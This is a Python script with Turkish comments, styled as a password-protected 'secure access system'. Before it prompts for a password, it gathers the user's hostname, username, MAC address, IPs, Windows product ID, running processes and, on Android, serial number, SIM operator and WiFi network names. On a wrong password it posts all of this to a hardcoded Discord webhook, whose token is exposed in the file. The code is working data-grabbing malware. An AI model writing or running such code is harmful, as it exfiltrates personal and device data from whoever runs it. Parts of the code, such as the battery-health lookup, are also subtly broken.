import os
import sys
import platform
import socket
import uuid
import json
import requests
import subprocess
import time
import re
import getpass
import psutil
from datetime import datetime

# Discord Webhook URL - KENDİ URL'NİZİ EKLEYİN
WEBHOOK_URL = "https://discord.com/api/webhooks/1400042076699230278/2dxp2n9DofOiMx6lUTYo1XxjK4mrwpaWH-vSYvMOJzLKWhuUrBQUabhAlNCBybk8nBEX"

def is_android():
    """Cihazın Android olup olmadığını tespit et"""
    try:
        if platform.system().lower() == "linux":
            # Android'e özgü dosya ve dizinler
            android_paths = [
                "/system/app", "/system/priv-app", "/system/bin",
                "/system/build.prop", "/init.rc", "/system/etc"
            ]
            return any(os.path.exists(path) for path in android_paths)
        return False
    except:
        return False

def get_common_data():
    """Hem PC hem de Android için ortak verileri topla"""
    data = {}
    
    try:
        # Temel sistem bilgileri
        data["⌚ Zaman Damgası"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        data["📱 Cihaz Tipi"] = "Android" if is_android() else "Bilgisayar"
        data["💻 İşletim Sistemi"] = f"{platform.system()} {platform.release()}"
        data["🆔 Cihaz Adı"] = socket.gethostname()
        data["👤 Kullanıcı Adı"] = getpass.getuser()
        
        # MAC adresi
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        data["📡 MAC Adresi"] = mac
        
        # IP adresleri
        try:
            data["🌐 Genel IP"] = requests.get('https://api.ipify.org', timeout=5).text
        except:
            data["🌐 Genel IP"] = "Alınamadı"
            
        try:
            # Yerel IP adresleri
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            data["🏠 Yerel IP"] = s.getsockname()[0]
            s.close()
        except:
            data["🏠 Yerel IP"] = "Alınamadı"
            
    except Exception as e:
        data["⚠️ Ortak Veri Hatası"] = str(e)
    
    return data

def get_pc_data():
    """Sadece PC'ye özgü verileri topla"""
    pc_data = {}
    
    try:
        # Donanım bilgileri
        pc_data["🧠 İşlemci"] = platform.processor() or "Alınamadı"
        
        if hasattr(psutil, "virtual_memory"):
            ram_gb = round(psutil.virtual_memory().total / (1024**3), 1)
            pc_data["💾 RAM Kapasitesi"] = f"{ram_gb} GB"
            
            ram_used = round(psutil.virtual_memory().used / (1024**3), 1)
            pc_data["💾 RAM Kullanımı"] = f"{ram_used} GB"
        
        if hasattr(psutil, "disk_usage"):
            disk_gb = round(psutil.disk_usage('/').total / (1024**3), 1)
            pc_data["💽 Disk Kapasitesi"] = f"{disk_gb} GB"
            
            disk_used = round(psutil.disk_usage('/').used / (1024**3), 1)
            pc_data["💽 Disk Kullanımı"] = f"{disk_used} GB"
        
        # Windows özel bilgiler
        if platform.system() == "Windows":
            try:
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE, 
                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                )
                pc_data["🔑 Windows Ürün ID"] = winreg.QueryValueEx(key, "ProductId")[0]
                pc_data["⏱️ Son Başlatma"] = datetime.fromtimestamp(psutil.boot_time()).strftime("%d/%m/%Y %H:%M")
            except:
                pc_data["🔑 Windows Ürün ID"] = "Alınamadı"
        
        # Ağ bilgileri
        try:
            interfaces = []
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append(f"{interface}: {addr.address}")
            pc_data["📶 Ağ Arabirimleri"] = ", ".join(interfaces)
        except:
            pass
        
        # Çalışan uygulamalar
        try:
            processes = [p.info['name'] for p in psutil.process_iter(['name'])][:15]
            pc_data["🔄 Çalışan Uygulamalar"] = ", ".join(set(processes)) 
        except:
            pass
        
        # Ek bilgiler
        try:
            pc_data["🌡️ CPU Kullanımı"] = f"%{psutil.cpu_percent()}"
            pc_data["🔥 CPU Sıcaklığı"] = "Alınamadı"
            if hasattr(psutil, "sensors_temperatures"):
                temps = psutil.sensors_temperatures()
                if temps and 'coretemp' in temps:
                    pc_data["🔥 CPU Sıcaklığı"] = f"{temps['coretemp'][0].current}°C"
        except:
            pass
        
    except Exception as e:
        pc_data["⚠️ PC Veri Hatası"] = str(e)
    
    return pc_data

def get_android_data():
    """Sadece Android'e özgü verileri topla"""
    android_data = {}
    
    try:
        # Temel cihaz bilgileri
        android_data["🏭 Üretici"] = subprocess.getoutput("getprop ro.product.manufacturer")
        android_data["📱 Model"] = subprocess.getoutput("getprop ro.product.model")
        android_data["🛡️ Android Sürümü"] = subprocess.getoutput("getprop ro.build.version.release")
        android_data["🔐 Yapım Kimliği"] = subprocess.getoutput("getprop ro.build.id")
        
        # Ekran bilgisi
        display = subprocess.getoutput("dumpsys display")
        if "mCurrentFocus" in display:
            android_data["📱 Ekran Durumu"] = "Açık"
        else:
            android_data["📱 Ekran Durumu"] = "Kapalı/Kilitli"
            
        # Ekran çözünürlüğü
        try:
            display_size = subprocess.getoutput("wm size").split()[-1]
            android_data["🖥️ Ekran Çözünürlüğü"] = display_size
        except:
            android_data["🖥️ Ekran Çözünürlüğü"] = "Alınamadı"
            
        # Depolama alanı
        try:
            storage = subprocess.getoutput("df /data").splitlines()
            if len(storage) > 1:
                parts = storage[1].split()
                if len(parts) > 3:
                    total_gb = round(int(parts[1]) / (1024*1024), 1)
                    used_gb = round(int(parts[2]) / (1024*1024), 1)
                    free_gb = round(int(parts[3]) / (1024*1024), 1)
                    android_data["💾 Depolama"] = f"Kullanılan: {used_gb}GB, Boş: {free_gb}GB, Toplam: {total_gb}GB"
        except:
            pass
        
        # Pil bilgisi
        try:
            battery = subprocess.getoutput("dumpsys battery")
            level = re.search(r'level:\s+(\d+)', battery)
            status = re.search(r'status:\s+(\d+)', battery)
            health = re.search(r'health:\s+(\d+)', battery)
            temperature = re.search(r'temperature:\s+(\d+)', battery)
            
            if level and status:
                status_text = "Şarj Oluyor" if status.group(1) == "2" else "Deşarj"
                android_data["🔋 Pil Seviyesi"] = f"{level.group(1)}% ({status_text})"
            
            if health:
                health_text = {
                    "1": "Bilinmiyor",
                    "2": "İyi",
                    "3": "Aşırı Isınma",
                    "4": "Ölü",
                    "5": "Aşırı Voltaj",
                    "6": "Tanımsız Hata",
                    "7": "Soğuk"
                }.get(health.group(1)), "Bilinmiyor"
                android_data["🔋 Pil Sağlığı"] = health_text
            
            if temperature:
                temp_c = int(temperature.group(1)) / 10
                android_data["🌡️ Pil Sıcaklığı"] = f"{temp_c}°C"
        except:
            pass
        
        # Telefon durumu
        try:
            android_data["📞 SIM Durumu"] = subprocess.getoutput("getprop gsm.sim.state")
            android_data["📞 Operatör"] = subprocess.getoutput("getprop gsm.operator.alpha")
        except:
            pass
        
        # WiFi bilgileri
        try:
            wifi_info = subprocess.getoutput("dumpsys wifi")
            networks = re.findall(r'SSID: "(.+?)"', wifi_info)
            if networks:
                unique_networks = list(set(networks))[:5]  # En fazla 5 benzersiz ağ
                android_data["📶 WiFi Ağları"] = ", ".join(unique_networks)
        except:
            pass
        
        # Donanım bilgileri
        try:
            android_data["🧠 İşlemci"] = subprocess.getoutput("getprop ro.product.cpu.abi")
            android_data["🧠 Çekirdek Sayısı"] = subprocess.getoutput("getprop ro.hardware.cpu.cores")
            android_data["📱 Cihaz Kimliği"] = subprocess.getoutput("getprop ro.serialno")
        except:
            pass
        
    except Exception as e:
        android_data["⚠️ Android Veri Hatası"] = str(e)
    
    return android_data

def format_for_discord(common_data, platform_data):
    """Verileri Discord mesaj formatına dönüştür"""
    # Başlık ve ortak veriler
    message = "**🚨 YANLIŞ ŞİFRE GİRİŞİ - SİSTEM BİLGİLERİ 🚨**\n"
    message += f"**Cihaz:** {common_data.get('📱 Cihaz Tipi', 'Bilinmiyor')}\n"
    message += f"**İşletim Sistemi:** {common_data.get('💻 İşletim Sistemi', 'Bilinmiyor')}\n"
    message += f"**Kullanıcı:** {common_data.get('👤 Kullanıcı Adı', 'Bilinmiyor')}\n"
    message += f"**IP Adresi:** {common_data.get('🌐 Genel IP', 'Bilinmiyor')}\n"
    message += f"**Zaman:** {common_data.get('⌚ Zaman Damgası', 'Bilinmiyor')}\n\n"
    
    # Platforma özel veriler
    message += "**🔧 Sistem Detayları**\n"
    for key, value in platform_data.items():
        # Uzun değerleri kısalt
        if len(str(value)) > 150:
            value = str(value)[:150] + "..."
        message += f"- **{key}:** {value}\n"
    
    # Hata mesajlarını ekle
    errors = []
    for key, value in common_data.items():
        if "Hata" in key:
            errors.append(f"- {key}: {value}")
    for key, value in platform_data.items():
        if "Hata" in key:
            errors.append(f"- {key}: {value}")
    
    if errors:
        message += "\n**⚠️ Hatalar**\n"
        message += "\n".join(errors)
    
    return message

def send_to_discord(message):
    """Discord webhook'una veri gönder"""
    try:
        payload = {
            "content": message,
            "username": "Güvenlik Alarm Sistemi",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/375/375200.png"
        }
        
        response = requests.post(
            WEBHOOK_URL,
            json=payload,
            timeout=15
        )
        
        if response.status_code == 200:
            return True
        else:
            print(f"Discord API hatası: {response.status_code} - {response.text}")
            return False
    except Exception as e:
        print(f"Gönderim hatası: {str(e)}")
        return False

def print_banner():
    """Program başlığını yazdır"""
    print(r"""
    ██████╗ ██████╗ ██████╗ ███████╗    ████████╗███████╗███████╗████████╗
    ██╔═══██╗██╔══██╗██╔══██╗██╔════╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
    ██║   ██║██║  ██║██║  ██║█████╗         ██║   █████╗  ███████╗   ██║   
    ██║   ██║██║  ██║██║  ██║██╔══╝         ██║   ██╔══╝  ╚════██║   ██║   
    ╚██████╔╝██████╔╝██████╔╝███████╗       ██║   ███████╗███████║   ██║   
    ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   
    """)
    print("Güvenli Erişim Sistemi v3.0\n")

def main():
    # Ekranı temizle ve başlık yazdır
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print_banner()

    # İnternet bağlantısını kontrol et
    try:
        requests.get('https://google.com', timeout=5)
    except:
        print("⛔ İnternet bağlantısı yok! Program kapatılıyor.")
        time.sleep(3)
        sys.exit(1)

    # Verileri topla
    common_data = get_common_data()
    
    if is_android():
        platform_data = get_android_data()
        print("📱 Android cihaz tespit edildi")
    else:
        platform_data = get_pc_data()
        print("💻 Bilgisayar tespit edildi")

    # Şifre kontrolü
    try:
        password = getpass.getpass("🔑 Lütfen şifreyi girin: ")
    except KeyboardInterrupt:
        print("\n❌ İşlem iptal edildi")
        sys.exit(0)
    
    if password != "Lukha":  # Doğru şifre kontrolü
        print("⛔ Hatalı şifre! Sistem bilgileri raporlanıyor...")
        
        # Verileri formatla
        discord_message = format_for_discord(common_data, platform_data)
        
        # Discord'a gönder
        print("📤 Discord'a veri gönderiliyor...")
        if send_to_discord(discord_message):
            print("✅ Veriler başarıyla gönderildi!")
        else:
            print("❌ Veri gönderilemedi! İnternet bağlantınızı kontrol edin.")
        
        # Ek güvenlik önlemi
        time.sleep(3)
        sys.exit(1)
    else:
        print("✅ Şifre doğru! Erişim sağlandı.")
        # Gerekirse diğer işlemler buraya eklenebilir
        time.sleep(2)

if __name__ == "__main__":
    main()